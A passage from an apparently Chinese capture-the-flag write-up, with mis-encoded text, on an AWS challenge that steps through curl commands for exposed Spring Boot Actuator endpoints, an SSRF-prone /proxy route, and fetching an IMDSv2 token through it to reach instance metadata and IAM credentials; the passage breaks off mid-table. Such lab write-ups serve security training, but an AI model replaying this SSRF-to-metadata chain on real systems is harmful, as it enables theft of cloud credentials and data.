href="https://cloudsecuritychampionship.com/challenge/1" title="é˜…è¯»åŸæ–‡">é¢˜ç›®é“¾æ¥</a>ã€‘ï¼Œç«‹å³è¿›å…¥æ¯”èµ›ç¯å¢ƒã€‚</p></blockquote><h2 id="0x01-é¢˜ç›®æè¿°"><a href="#0x01-é¢˜ç›®æè¿°" class="headerlink" title="0x01 é¢˜ç›®æè¿°"></a>0x01 é¢˜ç›®æè¿°</h2><p>ç»è¿‡å‡ å‘¨çš„æ¼æ´åˆ©ç”¨å’Œæƒé™æå‡ï¼Œä½ ç»ˆäºæ‹¿åˆ°äº†ä¸€ä¸ªæœåŠ¡å™¨çš„è®¿é—®æƒé™ï¼Œå¸Œæœ›è¿™å°±æ˜¯æœ€åä¸€ä¸ªç›®æ ‡æœåŠ¡å™¨ï¼Œå¹¶èƒ½å€Ÿæ­¤ä»ä¸€ä¸ª<strong>S3 å­˜å‚¨æ¡¶ä¸­æå–å‡ºéšè—çš„ flag</strong>ã€‚</p><p>ä½†äº‹æƒ…ä¸ä¼šé‚£ä¹ˆç®€å•ã€‚ç›®æ ‡ç¯å¢ƒä½¿ç”¨äº†<strong>AWS æ•°æ®è¾¹ç•Œï¼ˆdata perimeterï¼‰æ¥é™åˆ¶å¯¹è¯¥å­˜å‚¨æ¡¶å†…å®¹çš„è®¿é—®</strong>ã€‚ç¥ä½ å¥½è¿ï¼</p><p>ä½ å‘ç°äº†ä¸€ä¸ª<strong>éƒ¨ç½²åœ¨ AWS ä¸Šçš„ Spring Boot Actuator åº”ç”¨</strong>ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤è®¿é—®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com<br><br></code></pre></td></tr></table></figure><p>è¿”å›ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UP&quot;</span> <span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>è¿™è¡¨ç¤ºåº”ç”¨å½“å‰å¤„äºè¿è¡Œä¸­ çŠ¶æ€ã€‚</p><blockquote><p>ğŸ±<strong>å‹æƒ…æç¤º<br>æ•°æ®è¾¹ç•Œï¼ˆData Perimeterï¼‰</strong> æ˜¯ä¸€ç§ç­–ç•¥ç»„åˆï¼Œç”¨æ¥é™åˆ¶è°å¯ä»¥è®¿é—®å“ªäº›æ•°æ®ï¼Œåœ¨å“ªäº›ç½‘ç»œæ¡ä»¶ä¸‹å¯ä»¥è®¿é—®ï¼Œè®¿é—®è¡Œä¸ºæ˜¯å¦åˆè§„ï¼Œä»è€Œä¿è¯æ•°æ®ä¸ä¼šé€ƒç¦»ä½ ä¿¡ä»»çš„èŒƒå›´ã€‚</p></blockquote><p><img src="/image/image_WgqZ1d7P6u.png" alt="å›¾ 2ï¼šPerimeter Leak çš„é¢˜ç›®æè¿°" title="å›¾2ï¼šPerimeter Leakçš„é¢˜ç›®æè¿°"></p><p>æ ¹æ®é¢˜ç›®æè¿°ï¼Œæˆ‘ä»¬æ€»ç»“å‡ºä»¥ä¸‹ä¸‰ç‚¹å…³é”®ä¿¡æ¯ï¼š</p><ol><li>â€œS3 å­˜å‚¨æ¡¶ä¸­æå–å‡ºéšè—çš„ flagâ€ï¼šflag å­˜å‚¨åœ¨ S3 ä¸­ï¼›</li><li>â€œä½¿ç”¨äº† AWS æ•°æ®è¾¹ç•Œï¼ˆdata perimeterï¼‰æ¥é™åˆ¶å¯¹è¯¥å­˜å‚¨æ¡¶å†…å®¹çš„è®¿é—®â€ï¼šéœ€è¦è·å–ç›¸å…³å‡­è¯ä»¥å®ç°æƒé™æå‡ï¼›</li><li>â€œéƒ¨ç½²åœ¨ AWS ä¸Šçš„ Spring Boot Actuator åº”ç”¨â€ï¼šä¼šè”æƒ³åˆ° Spring Boot Actuator å¯èƒ½å› ä¸º API æ¥å£é…ç½®ä¸å½“ï¼Œæš´éœ²ä¸€äº›æ•æ„Ÿä¿¡æ¯ã€‚</li></ol><blockquote><p>ğŸ±<strong>å‹æƒ…æç¤º</strong></p><p>ä¹‹å‰æ›¾å‘æŸä½å¤§ä½¬è¯·æ•™è¿‡ï¼Œä»–è¡¨ç¤ºï¼šâ€œåœ¨ Spring Boot ä¸­ï¼Œå†…å­˜æ³„æ¼çš„å®é™…æ¡ˆä¾‹è™½ç„¶è¾ƒä¸ºå°‘è§ï¼Œä½†ä¸€æ—¦å‘ç”Ÿï¼Œå¾€å¾€ä¼šå¸¦æ¥ä¸¥é‡åæœã€‚â€å› æ­¤ï¼Œåœ¨å¤„ç† Spring Boot ç›¸å…³é—®é¢˜æ—¶ï¼Œå¤§å®¶åŠ¡å¿…ä¿æŒé«˜åº¦è­¦æƒ•ï¼Œåˆ‡å‹¿æ‰ä»¥è½»å¿ƒã€‚</p></blockquote><h2 id="0x02-è§£é¢˜è¿‡ç¨‹"><a href="#0x02-è§£é¢˜è¿‡ç¨‹" class="headerlink" title="0x02 è§£é¢˜è¿‡ç¨‹"></a>0x02 è§£é¢˜è¿‡ç¨‹</h2><h3 id="2-1-ç¯å¢ƒæ¢æµ‹ï¼šé€šè¿‡-Actuator-æ¥å£è·å–æ•æ„Ÿä¿¡æ¯"><a href="#2-1-ç¯å¢ƒæ¢æµ‹ï¼šé€šè¿‡-Actuator-æ¥å£è·å–æ•æ„Ÿä¿¡æ¯" class="headerlink" title="2.1 ç¯å¢ƒæ¢æµ‹ï¼šé€šè¿‡ Actuator æ¥å£è·å–æ•æ„Ÿä¿¡æ¯"></a>2.1 ç¯å¢ƒæ¢æµ‹ï¼šé€šè¿‡ Actuator æ¥å£è·å–æ•æ„Ÿä¿¡æ¯</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥æœç´¢ä¸€äº›å›  Spring Boot æš´éœ² Actuator æ¥å£è€Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€æƒé™æå‡ç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰çš„æ–‡ç« ã€‚ä¾‹å¦‚ï¼š</p><ul><li><a href="https://github.com/LandGrey/SpringBootVulExploit/" title="ã€ŠSpring Boot Vulnerability Exploit Check Listã€‹">ã€ŠSpring Boot Vulnerability Exploit Check Listã€‹</a></li><li><a href="https://www.freebuf.com/news/234266.html" title="ã€ŠSpring Boot Actuator æ¼æ´åˆ©ç”¨ã€‹">ã€ŠSpring Boot Actuator æ¼æ´åˆ©ç”¨ã€‹</a></li><li><a href="https://blog.csdn.net/god_zzZ/article/details/122837698" title="ã€ŠSpring Boot Actuator æ¼æ´å¤ç°åˆé›†ã€‹">ã€ŠSpring Boot Actuator æ¼æ´å¤ç°åˆé›†ã€‹</a></li></ul><p>åœ¨æŸ¥çœ‹ <code>/actuator/env</code>æ¥å£æ—¶ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_kMc8NjFEhw.png" alt="å›¾ 3ï¼š &#x2F;actuator&#x2F;env æ¥å£è¿”å›äº†ä¸€äº›æœ‰è¶£çš„ä¿¡æ¯" title="å›¾3ï¼š &#x2F;actuator&#x2F;env æ¥å£è¿”å›äº†ä¸€äº›æœ‰è¶£çš„ä¿¡æ¯"></p><p>è¾“å‡ºå†…å®¹ä¸­åŒ…å«å¤§é‡æ— å…³ä¿¡æ¯ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨æ˜¯å¦èƒ½å¤Ÿæ‰¾åˆ° S3 å­˜å‚¨æ¡¶åç§°ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq .propertySources[3].properties.BUCKET<br></code></pre></td></tr></table></figure><p><img src="/image/image_V1u98IT3DS.png" alt="å›¾ 4ï¼šä» &#x2F;actuator&#x2F;env æ¥å£ä¸­è·å–äº† S3 å­˜å‚¨æ¡¶åç§°" title="å›¾4ï¼šä» &#x2F;actuator&#x2F;env æ¥å£ä¸­è·å–äº†S3 å­˜å‚¨æ¡¶åç§°"></p><h3 id="2-2-ç›²æ¢å°è¯•ï¼šæ— æ³•åŒ¿åè®¿é—®å­˜å‚¨æ¡¶"><a href="#2-2-ç›²æ¢å°è¯•ï¼šæ— æ³•åŒ¿åè®¿é—®å­˜å‚¨æ¡¶" class="headerlink" title="2.2 ç›²æ¢å°è¯•ï¼šæ— æ³•åŒ¿åè®¿é—®å­˜å‚¨æ¡¶"></a>2.2 ç›²æ¢å°è¯•ï¼šæ— æ³•åŒ¿åè®¿é—®å­˜å‚¨æ¡¶</h3><p>æˆåŠŸæ‰¾åˆ° S3 å­˜å‚¨æ¡¶åç§°åï¼Œå°è¯•è¿›è¡ŒåŒ¿åè®¿é—®ï¼Œä½†æœªèƒ½æˆåŠŸã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦è·å–ç›¸åº”çš„ IAM å‡­è¯ï¼Œä»¥ä¾¿è®¿é—®å­˜å‚¨æ¡¶ä¸­çš„æ•°æ®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://challenge01-470f711/ --no-sign-request<br></code></pre></td></tr></table></figure><p><img src="/image/image_3JMiuQRMGg.png" alt="å›¾ 5ï¼šåŒ¿åè®¿é—®åä¸º challenge01-470f711 çš„ S3 å­˜å‚¨æ¡¶å¤±è´¥" title="å›¾5ï¼šåŒ¿åè®¿é—®åä¸º challenge01-470f711 çš„S3 å­˜å‚¨æ¡¶å¤±è´¥"></p><h3 id="2-3-æ¥å£å‘ç°ï¼šå¯»æ‰¾æ›´å¤šå¯ç”¨çš„-Actuator-æ¥å£"><a href="#2-3-æ¥å£å‘ç°ï¼šå¯»æ‰¾æ›´å¤šå¯ç”¨çš„-Actuator-æ¥å£" class="headerlink" title="2.3 æ¥å£å‘ç°ï¼šå¯»æ‰¾æ›´å¤šå¯ç”¨çš„ Actuator æ¥å£"></a>2.3 æ¥å£å‘ç°ï¼šå¯»æ‰¾æ›´å¤šå¯ç”¨çš„ Actuator æ¥å£</h3><p>åœ¨æƒé™å—é™çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç¼–å†™ä¸€ä¸ª shell è„šæœ¬ï¼Œé€šè¿‡æ‰¹é‡æ‰§è¡Œ <code>curl</code> å‘½ä»¤æ£€æŸ¥è¿”å›çš„çŠ¶æ€ç ï¼Œä»¥æ­¤åˆ¤æ–­å“ªäº› API æ¥å£èƒ½å¤Ÿè·å–æœ‰æ•ˆä¿¡æ¯ã€‚ç„¶è€Œï¼Œç›®å‰æ‰€æœ‰è¯·æ±‚å‡è¿”å› <code>404</code> é”™è¯¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/heapdump | jq<br>curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/heapdump | jq<br>curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/threaddump | jq<br>curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/mappings | jq<br></code></pre></td></tr></table></figure><p><img src="/image/image_qF-Uh5Hp_w.png" alt="å›¾ 6ï¼šå¯¹ Actuator æ¥å£è¿›è¡Œæ‰¹é‡è¯·æ±‚ï¼Œå¯å‡è¿”å› 404 é”™è¯¯" title="å›¾6ï¼šå¯¹ Actuator æ¥å£è¿›è¡Œæ‰¹é‡è¯·æ±‚ï¼Œå¯å‡è¿”å› 404 é”™è¯¯"></p><p>å¯å½“æˆ‘ä»¬è®¿é—® <code>/actuator/mappings</code> æ¥å£æ—¶ï¼Œè¿”å›äº†ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq<br></code></pre></td></tr></table></figure><p><img src="/image/image_qJp3lMQo99.png" alt="å›¾ 7ï¼šè®¿é—® &#x2F;actuator&#x2F;mappings æ¥å£æ—¶ï¼Œè¿”å›äº†å¤§é‡çš„ä¿¡æ¯" title="å›¾ 7 ï¼š è®¿é—® &#x2F;actuator&#x2F;mappings æ¥å£æ—¶ï¼Œè¿”å›äº†å¤§é‡çš„ä¿¡æ¯"></p><p>é€šè¿‡åˆ†æ Spring Boot åº”ç”¨çš„æ¥å£å…ƒä¿¡æ¯ï¼Œæˆ‘ä»¬è¯†åˆ«å‡ºäº†å­˜åœ¨ SSRF æ¼æ´çš„ <code>/proxy</code> æ¥å£ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq .contexts.spring.mappings.dispatcherServlets.dispatcherServlet[25]<br></code></pre></td></tr></table></figure><p><img src="/image/image_XcslrDGSsP.png" alt="å›¾ 8ï¼š&#x2F;proxy æ¥å£å­˜åœ¨ SSRF æ¼æ´" title="å›¾8ï¼š&#x2F;proxy æ¥å£å­˜åœ¨ SSRF æ¼æ´"></p><h4 id="ç†ç”±ä¸€ï¼šè·¯å¾„å’Œå‚æ•°å®šä¹‰æš´éœ²-SSRF-å…¥å£"><a href="#ç†ç”±ä¸€ï¼šè·¯å¾„å’Œå‚æ•°å®šä¹‰æš´éœ²-SSRF-å…¥å£" class="headerlink" title="ç†ç”±ä¸€ï¼šè·¯å¾„å’Œå‚æ•°å®šä¹‰æš´éœ² SSRF å…¥å£"></a>ç†ç”±ä¸€ï¼šè·¯å¾„å’Œå‚æ•°å®šä¹‰æš´éœ² SSRF å…¥å£</h4><p>åŒ…å«ä¸€ä¸ªåä¸º<code>/proxy</code> çš„ HTTP è·¯ç”±ï¼Œå®ƒè¦æ±‚å¿…é¡»å¸¦æœ‰<code>url</code> å‚æ•°ï¼Œä¸”å¾ˆæœ‰å¯èƒ½æ˜¯é€šè¿‡<code>GET /proxy?url=http://example.com</code> è¿™æ ·çš„å½¢å¼ä½¿ç”¨ï¼›</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;predicate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123; [/proxy], params [url]&#125;&quot;</span> <span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h4 id="ç†ç”±äºŒï¼šå¤„ç†é€»è¾‘æš´éœ²æœåŠ¡å™¨å‘èµ·è¯·æ±‚è¡Œä¸º"><a href="#ç†ç”±äºŒï¼šå¤„ç†é€»è¾‘æš´éœ²æœåŠ¡å™¨å‘èµ·è¯·æ±‚è¡Œä¸º" class="headerlink" title="ç†ç”±äºŒï¼šå¤„ç†é€»è¾‘æš´éœ²æœåŠ¡å™¨å‘èµ·è¯·æ±‚è¡Œä¸º"></a>ç†ç”±äºŒï¼šå¤„ç†é€»è¾‘æš´éœ²æœåŠ¡å™¨å‘èµ·è¯·æ±‚è¡Œä¸º</h4><p>è¯¥è¯·æ±‚ç”±<code>challenge.Application</code>ç±»ä¸­çš„<code>proxy(String)</code> æ–¹æ³•å¤„ç†ï¼Œ<code>proxy(String)</code>æ„å‘³ç€æ•´ä¸ªæ–¹æ³•åªæ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼ˆè¿™ä¸ªå‚æ•°å°±æ˜¯ç”¨æˆ·ä¼ å…¥çš„<code>url</code>ï¼‰ï¼Œæ ¹æ®<code>descriptor</code> å­—æ®µå¾—çŸ¥æ–¹æ³•è¿”å›ç±»å‹æ˜¯<code>String</code>ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;handler&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;challenge.Application#proxy(String)&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;descriptor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;(Ljava/lang/String;)Ljava/lang/String;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h4 id="ç†ç”±ä¸‰ï¼šæ¥å£æ²¡æœ‰ä»»ä½•è®¿é—®é™åˆ¶æˆ–æ ¡éªŒæ¡ä»¶"><a href="#ç†ç”±ä¸‰ï¼šæ¥å£æ²¡æœ‰ä»»ä½•è®¿é—®é™åˆ¶æˆ–æ ¡éªŒæ¡ä»¶" class="headerlink" title="ç†ç”±ä¸‰ï¼šæ¥å£æ²¡æœ‰ä»»ä½•è®¿é—®é™åˆ¶æˆ–æ ¡éªŒæ¡ä»¶"></a>ç†ç”±ä¸‰ï¼šæ¥å£æ²¡æœ‰ä»»ä½•è®¿é—®é™åˆ¶æˆ–æ ¡éªŒæ¡ä»¶</h4><p>æ²¡æœ‰ä»»ä½•<code>headers</code>ã€<code>methods</code>æˆ–<code>consumes</code> é™åˆ¶ï¼Œåªè¦æ»¡è¶³<code>/proxy?url=xxx</code> å½¢å¼å°±èƒ½è§¦å‘ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;requestMappingConditions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;consumes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;methods&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;url&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;negated&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;/proxy&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;produces&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-4-SSRF-æˆç«‹ï¼šå‘-IMDS-å‘èµ·è¯·æ±‚"><a href="#2-4-SSRF-æˆç«‹ï¼šå‘-IMDS-å‘èµ·è¯·æ±‚" class="headerlink" title="2.4 SSRF æˆç«‹ï¼šå‘ IMDS å‘èµ·è¯·æ±‚"></a>2.4 SSRF æˆç«‹ï¼šå‘ IMDS å‘èµ·è¯·æ±‚</h3><p>å‰é¢æˆ‘ä»¬å·²ç»çŸ¥é“è¯¥åº”ç”¨è¿è¡Œåœ¨ EC2 ä¸Šï¼Œè¿™è‡ªç„¶è®©æˆ‘ä»¬è”æƒ³åˆ°é€šè¿‡ SSRF æ¼æ´è®¿é—®å®ä¾‹<strong>å…ƒæ•°æ®æœåŠ¡ï¼ˆInstance Metadata Serviceï¼Œç®€ç§° IMDSï¼‰</strong>ã€‚</p><p>IMDS æ˜¯ EC2 å®ä¾‹ç”¨äºè·å– IAM ä¸´æ—¶å‡­è¯ã€å®ä¾‹ ID å’Œ AMI ç­‰è‡ªèº«å…ƒæ•°æ®çš„æ¥å£ã€‚å…±æœ‰ IMDSv1 å’Œ IMDSv2 ä¸¤ä¸ªç‰ˆæœ¬ï¼š</p><ul><li>IMDSv1ï¼šé€šè¿‡<code>http://169.254.169.254/latest/meta-data/</code> ç›´æ¥è®¿é—®ï¼Œæ— éœ€éªŒè¯ã€‚</li><li>IMDSv2ï¼šå¼•å…¥äº† token-based è®¤è¯æœºåˆ¶ï¼Œè¦æ±‚å…ˆé€šè¿‡<code>PUT</code> è¯·æ±‚è·å– tokenï¼Œç„¶åå¸¦ä¸Š token è®¿é—®å…ƒæ•°æ®ã€‚</li></ul><p>äºæ˜¯ï¼Œæˆ‘ä»¬é€šè¿‡ SSRF æ¼æ´ç›´æ¥è®¿é—®<code>http://169.254.169.254/latest/meta-data</code> æ¥å£ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/<br></code></pre></td></tr></table></figure><p><img src="/image/image_ffwB3cAs_K.png" alt="å›¾ 9ï¼šé€šè¿‡ IMDSv1 è®¿é—® EC2 å®ä¾‹å…ƒæ•°æ®å¤±è´¥" title="å›¾9ï¼šé€šè¿‡ IMDSv1 è®¿é—® EC2 å®ä¾‹å…ƒæ•°æ®å¤±è´¥"></p><p>æ¥å£è¿”å›<code>HTTP 401 Unauthorized</code>ï¼Œè¿™è¡¨æ˜ EC2 å®ä¾‹å¯åŠ¨çš„æ˜¯ IMDSv2ï¼Œæˆ‘ä»¬éœ€è¦è·å– tokenï¼Œå†è®¿é—®æ•°æ®ã€‚IMDSv2 æ˜¯å¯¹ IMDSv1 çš„å®‰å…¨å¢å¼ºç‰ˆæœ¬ï¼Œé€šè¿‡å¼•å…¥ token æœºåˆ¶ï¼Œé˜²æ­¢ SSRF ç­‰æ”»å‡»çªƒå–å®ä¾‹å…ƒæ•°æ®ï¼ˆå°¤å…¶æ˜¯ IAM å‡­è¯ï¼‰ã€‚</p><blockquote><p>ğŸ±<strong>å‹æƒ…æç¤º</strong></p><p>169.254.169.254 æ˜¯ä¸€ä¸ª AWS äº‘å¹³å°ä¿ç•™çš„æœ¬åœ°åœ°å€ï¼Œä¸“é—¨ç”¨äºåœ¨å®ä¾‹å†…éƒ¨è®¿é—®å…ƒæ•°æ®æœåŠ¡ï¼Œå®ƒä¸ä¼šå‡ºç°åœ¨å…¬ç½‘è·¯ç”±ä¸­ï¼Œæ˜¯äº‘è®¡ç®—å®‰å…¨ä¸è‡ªåŠ¨åŒ–çš„é‡è¦åŸºç¡€è®¾æ–½ä¹‹ä¸€ã€‚è¯¦æƒ…è¯·çœ‹ AWS å®˜æ–¹çŸ¥è¯†ä¸­å¿ƒ<a href="https://repost.aws/knowledge-center/ec2-linux-metadata-retrieval" title="ã€ŠHow do I troubleshoot instance metadata issues on my EC2 Linux instance?ã€‹">ã€ŠHow do I troubleshoot instance metadata issues on my EC2 Linux instance?ã€‹</a></p></blockquote><h3 id="2-5-è·å–-Tokenï¼šç»•è¿‡-IMDSv2-å®‰å…¨æœºåˆ¶"><a href="#2-5-è·å–-Tokenï¼šç»•è¿‡-IMDSv2-å®‰å…¨æœºåˆ¶" class="headerlink" title="2.5 è·å– Tokenï¼šç»•è¿‡ IMDSv2 å®‰å…¨æœºåˆ¶"></a>2.5 è·å– Tokenï¼šç»•è¿‡ IMDSv2 å®‰å…¨æœºåˆ¶</h3><p>é‚£ä¹ˆï¼Œå¦‚ä½•ç»•è¿‡ IMDSv2 çš„æœºåˆ¶å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥æœç´¢ AWS çš„å®˜æ–¹çŸ¥è¯†æ–‡åº“ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html" title="ã€ŠUse the Instance Metadata Service to access instance metadataã€‹">ã€ŠUse the Instance Metadata Service to access instance metadataã€‹</a>ã€‚</p><ul><li>æ–¹æ³•ä¸€ï¼šç¯å¢ƒå…è®¸çš„å‰æä¸‹ï¼Œå›é€€åˆ° IMDSv1ï¼›</li><li>æ–¹æ³•äºŒï¼šè‹¥æœ‰å‘½ä»¤æ‰§è¡Œçš„æƒé™ï¼Œåœ¨å®ä¾‹ä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œè·å– token çš„å€¼ã€‚</li></ul><p><img src="/image/image_usZAYKW4gQ.png" alt="å›¾ 10ï¼šAWS å®˜æ–¹æ–‡æ¡£è®°å½•çš„é€šè¿‡ token è·å– EC2 å®ä¾‹å…ƒæ•°æ®çš„æ–¹å¼" title="å›¾ 10 ï¼šAWS å®˜æ–¹æ–‡æ¡£è®°å½•çš„é€šè¿‡ token è·å– EC2 å®ä¾‹å…ƒæ•°æ®çš„æ–¹å¼"></p><p>æˆ‘ä»¬é‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼Œæ„é€ ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è·å– IMDSv2 çš„ token</span><br>TOKEN=$(curl -s -X PUT \<br>  <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token&quot;</span> \<br>  -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span>)<br><br><span class="hljs-comment"># ä½¿ç”¨ token è¯·æ±‚ metadata</span><br>curl -s -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token: <span class="hljs-variable">$TOKEN</span>&quot;</span> \<br>  <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/image/image_x6vQ5WK44g.png" alt="å›¾ 11ï¼šæˆåŠŸé€šè¿‡ token è·å–åˆ° EC2 å®ä¾‹çš„å…ƒæ•°æ®" title="å›¾ 11 ï¼š æˆåŠŸé€šè¿‡ token è·å–åˆ° EC2 å®ä¾‹çš„å…ƒæ•°æ®"></p><p>æˆ‘ä»¬å¯ä»¥é‡ç‚¹æŸ¥çœ‹<code>iam/</code> å’Œ<code>identity-credentials/</code> ä¸¤ä¸ª metadata è·¯å¾„ï¼Œå®ƒä»¬æ¶‰åŠåˆ° AWS è®¤è¯å‡­è¯ã€‚å…¶å®ƒçš„è·¯å¾„å¤šæ•°ä¸ºä¿¡æ¯æ€§å­—æ®µï¼Œä¸åŒ…å«å¯ç”¨äºæƒé™æå‡çš„å†…å®¹ï¼Œæˆ‘ä»¬ç®€å•äº†è§£å³å¯ã€‚</p><table><thead><tr><th>è·¯å¾„</th><th>å†…å®¹</th><th>æ”»å‡»ä»·å€¼</th></tr></thead><tbody><tr><td>`instance-id`</td><td>å®ä¾‹ ID</td><td>ä¿¡æ¯æ€§</td></tr><tr><td>`ami-id`</td><td>å½“å‰ä½¿ç”¨çš„ AMI</td><td>ä¿¡æ¯æ€§</td></tr><tr><td>`placement&#x2F;availability-zone`</td><td>åŒºåŸŸ</td><td>ä¿¡æ¯æ€§</td></tr><tr><td>`hostname`&#x2F;`local-ipv4`</td><td>ä¸»æœºåã€ç§æœ‰ 